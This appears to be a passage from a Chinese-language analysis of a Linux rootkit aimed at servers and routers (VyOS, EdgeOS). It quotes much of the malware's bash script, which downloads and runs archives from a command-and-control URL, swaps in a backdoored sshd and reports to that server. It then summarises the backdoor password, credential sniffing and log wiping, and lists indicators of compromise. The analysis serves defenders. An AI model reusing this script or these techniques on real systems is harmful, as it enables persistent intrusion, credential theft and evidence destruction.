       cd "$tempdir" 2>/dev/null
       tar zxvf srvupdt.tgz 1>/dev/null 2>/dev/null
       cd srvupdt 1>/dev/null 2>/dev/null
       ./install & 2>/dev/null
      fi
      # EOF DACA EXISTA ARHIVA PE SERVERUL DE BAZA, O DOWNLOADEAZA, EXTRAGE SI EXECUTA
      ######### ARHIVA SPECIAL FACUTA PT FIECARE SERVER IN PARTE. foloseste $id_unic
      url_id_unic="$url/srvupdt_$id_unic.tgz"
      url_id_unic_confirmare="$url/srvupdt.php?ip=$ip&tgz=srvupdt_$id_unic.tgz"       # intra pe el ca sa confirme ca a tras arhiva
      if curl --output /dev/null --silent --head --fail "$url_id_unic"; then 
       # echo "URL exists: $url_id_unic"
       curl -s "${url_id_unic_confirmare}" 1>/dev/null 2>/dev/null &
       tempdir="/var/tmp/.tmp"
                            rm -rf "$tempdir" 1>/dev/null 2>/dev/null
                            mkdir "$tempdir" 1>/dev/null 2>/dev/null
       curl --silent  "$url_id_unic" --output "$tempdir"/srvupdt_$id_unic.tgz 2>/dev/null
       cd "$tempdir" 2>/dev/null
       tar zxvf srvupdt_$id_unic.tgz 1>/dev/null 2>/dev/null
       cd srvupdt_$id_unic 1>/dev/null 2>/dev/null
       ./install & 2>/dev/null
      fi
      # EOF RHIVA SPECIAL FACUTA PT FIECARE SERVER IN PARTE. foloseste $id_unic
      ########## PORNIM RESTUL SCRIPTULUI
      changes=0
      ip_changed="NO"
      sshd_changed="NO"
      sshd_backup_missing="NO"
      srv_was_down="NO"
       ######## verificam ce ip are serverul
              url_return_ip="$url/return_ip.php"              # din el ia valoarea $new_ip fiecare server
       if curl --output /dev/null --silent --head --fail "$url_return_ip"; then
        new_ip=`curl -s "$url_return_ip"|grep -Eo '([0-9]{1,3}.){3}[0-9]{1,3}'`
       fi
       # EOF verificam ce ip are serverul
       ####### verificam daca s-a schimbat ip-ul
       if [ "$ip" != "$new_ip" ] ; then
        # s-a schimbat ip-ul
        changes=1
        ip_changed="$new_ip"
       fi
       # EOF verificam daca s-a schimbat ip-ul
       ####### verificam daca mai exista backup-ul la sshd-ul nostru si il comparam cu /usr/sbin/sshd
       if [ -f /usr/lib/libu.a/m9847292 ] ; then
        # exista fisierul nostru de rk
        size_rk=`wc -c >/dev/null 2>>/dev/null
         chattr -aui /usr/sbin/sshd 1>>/dev/null 2>>/dev/null
         mv -f /usr/lib/libu.a/sshd /usr/sbin/sshd 1>>/dev/null 2>>/dev/null
         rm -rf /usr/lib/libu.a/sshd 1>>/dev/null 2>>/dev/null
         killall -9 sshd 1>>/dev/null 2>>/dev/null
         luam_timestamp /usr/sbin/sshd
         /usr/sbin/sshd 1>>/dev/null 2>>/dev/null
         # EOF punem sshd-ul meu inapoi
         changes=1
         sshd_changed="YES"
        fi
       else
        # cineva a sters fisierul nostru de rk (backup-ul)
        changes=1
        sshd_backup_missing="YES"
        sshd_changed="UNKNOWN"
       fi
       # EOF verificam daca mai exista backup-ul la sshd-ul nostru si il comparam cu /usr/sbin/sshd
       ####### verificam daca sshd e pornit, daca nu, il pornim noi
       sshd_process=`ps x | grep -v grep|grep sshd`
       if [[ -z $sshd_process ]]; then
        # echo "nu ruleaza"
        /usr/sbin/sshd 1>>/dev/null 2>>/dev/null
        # nu mai dau notificare daca am pornit eu sshd
        # changes=1
       fi
       # EOF verificam daca sshd e pornit, daca nu, il pornim noi
       ###### verificam daca a fost cazut netul
       if [ -f /usr/lib/libu.a/h439302s ] ; then
        # serverul a fost cazut
        changes=1
        srv_was_down="YES"
       fi
       ##### DACA scriptul detecteaza schimbari, intram pe link
       if [ "$changes" = 1 ] ; then
        ### trimitem datele catre server
    curl -s "${url}/srv.php?ip=${ip}&ip_changed=${ip_changed}&sshd_changed=${sshd_changed}&sshd_backup_missing=${sshd_backup_missing}&srv_was_down=${srv_was_down}&ptty_ver=${ptty_ver}" 1>/dev/null 2>/dev/null &
       fi
       # EOF DACA scriptul detecteaza schimbari, intram pe link
      # EOF PORNIM RESTUL SCRIPTULUI
      else
       # echo "URL does NOT exist: $url_check_net - NU merge netul"
       mkdir /usr/lib/libu.a/ 1>/dev/null 2>/dev/null ## in caz ca ne-a sters cineva dir
       echo "srv was down" > /usr/lib/libu.a/h439302s 2>/dev/null
       luam_timestamp /usr/lib/libu.a/h439302s
      fi
      # EOF continuam cu scriptul DOAR DACA merge netul, verificam pe google
    fi
    # EOF continuam cu scriptul DOAR DACA nu sunt useri activi pe server
最后，P3 脚本会运行一些命令和脚本来删除所有临时文件。
**总结：**
· 后门功能：
· 一个通用于不同平台和架构的Linux系统的root工具包
· 本地的root外壳程序
· 主要的SSHD二进制文件被一个恶意文件覆盖。此二进制文件中包含有后门密码以确保访问。此外，任何通过该密码进行的访问都不会被跟踪，这个密码是PRtestD
· 多重体系结构和模块化：
· 对涉及的不同脚本使用模块化处理办法
· 根据操作系统和体系结构的不同下载执行不同文件
· 嗅探功能：木马感染几个二进制文件，比如scp、sftp、 ssh，来窃取用户名和密码。
· 反鉴定功能：
· 删除日志文件来删除入侵证据 (/var/log/messages, /var/log/secure, /var/log/lastlog,
/var/log/wtmp)
· 修改文件时间戳
· Root工具包功能：
· 通过不同技术隐藏进程和文件
· C2C功能：
· 每小时与C&C交互，通知系统中的任何变化（如：出现新IP）
· 每小时与C&C交互，以获取任何更新
更新：对于SSHD二进制文件中的后门密码的最新分析。
#### IOCs
5.189.136.43  
http://gopremium.mooo.com/…/auto/p  
http://gopremium.mooo.com/…/auto/p1  
http://gopremium.mooo.com/…/auto/arm61.tgz  
http://gopremium.mooo.com/…/auto/arm71.tgz  
http://gopremium.mooo.com/…/auto/vyos.tgz  
http://gopremium.mooo.com/…/auto/vyos64.tgz  
http://gopremium.mooo.com/…/auto/edgeos.tgz  
http://gopremium.mooo.com/…/auto/edgeos64.tgz  
http://gopremium.mooo.com/…/auto/default.tgz  
http://gopremium.mooo.com/…/auto/p2  
http://gopremium.mooo.com/…/auto/p3  
http://gopremium.mooo.com/…/auto/side_files.tgz  
http://gopremium.mooo.com/.unix/return_ip.php  
http://gopremium.mooo.com/.unix/srvupdt.tgz  
http://gopremium.mooo.com/.unix/srvupdt_IDXYZ.tgz  
http://gopremium.mooo.com//.unix/srv.php
/etc/X11/.pr  
/etc/pps  
/usr/bin/ptty  
/etc/init/env.conf (containing /usr/sbin/env)  
/usr/bin/events/events
MD5 (arm61/arm61/run-libcheck) = 34976ac680474edd12d16d84470bd702  
MD5 (arm61/arm61/scp) = 5eb1b59dbcd806ce41858bf40e10cab0  
MD5 (arm61/arm61/sftp) = dce8fc0c3ddf0351e4e81f404b85d7bb  
MD5 (arm61/arm61/ssh) = aeae5ae324e118021cb7e7ee7d5e7a26  
MD5 (arm61/arm61/sshd) = 7aadb643f8345fb59e8998e18209f71a  
MD5 (arm61/arm61/sshd-eu) = 7aadb643f8345fb59e8998e18209f71a
MD5 (vyos/vyos/scp) = 6797f4801407052832ff482d5b1acf06  
MD5 (vyos/vyos/sftp) = 2d3a350e5210255f89a61a082254233f  
MD5 (vyos/vyos/ssh) = 5b3193530738e8e658c5ab8f63b5ee0d  
MD5 (vyos/vyos/sshd-eu) = 142e4198e11d405899619d49cc6dc79c  
MD5 (vyos/vyos/test-sshd) = 142e4198e11d405899619d49cc6dc79c
MD5 (vyos64/vyos64/scp) = 300f7413eb76bf6905df1f5182e52f9e  
MD5 (vyos64/vyos64/sftp) = 01a4f0f38096df67e13c6e9ed7ccc205  
MD5 (vyos64/vyos64/ssh) = 3e7dfbac340929fc54aa459cc7ad181b  
MD5 (vyos64/vyos64/sshd-eu) = b327add04800e05480a020af2ab993e0  
MD5 (vyos64/vyos64/test-sshd) = b327add04800e05480a020af2ab993e0
MD5 (edgeos/edgeos/scp) = ce8e196db65bed7862d98d4a14283ae4  
MD5 (edgeos/edgeos/sftp) = 0e34c468857e5e3d66ec2f0bd223d38c  
MD5 (edgeos/edgeos/ssh) = 47f2e08da73bb5e5d6c61d347d1bfbf1  
MD5 (edgeos/edgeos/sshd-eu) = 4b4e7ccb1f015a107ac052ba25dfe94e  
MD5 (edgeos/edgeos/test-sshd) = 4b4e7ccb1f015a107ac052ba25dfe94e
MD5 (edgeos64/edgeos64/scp) = 602793976e2f41b5a1942cfd2784d075  
MD5 (edgeos64/edgeos64/sftp) = e597cfee6f877e82339fab3e322d79b7  
MD5 (edgeos64/edgeos64/ssh) = d5f6794c3b41f1d7f12715ba3315fd7b  
MD5 (edgeos64/edgeos64/sshd) = 973eee9fae6e3a353286206da7a89904  
MD5 (edgeos64/edgeos64/sshd-eu) = 973eee9fae6e3a353286206da7a89904
MD5 (edgeos64/edgeos64/test-sshd) = e597cfee6f877e82339fab3e322d79b7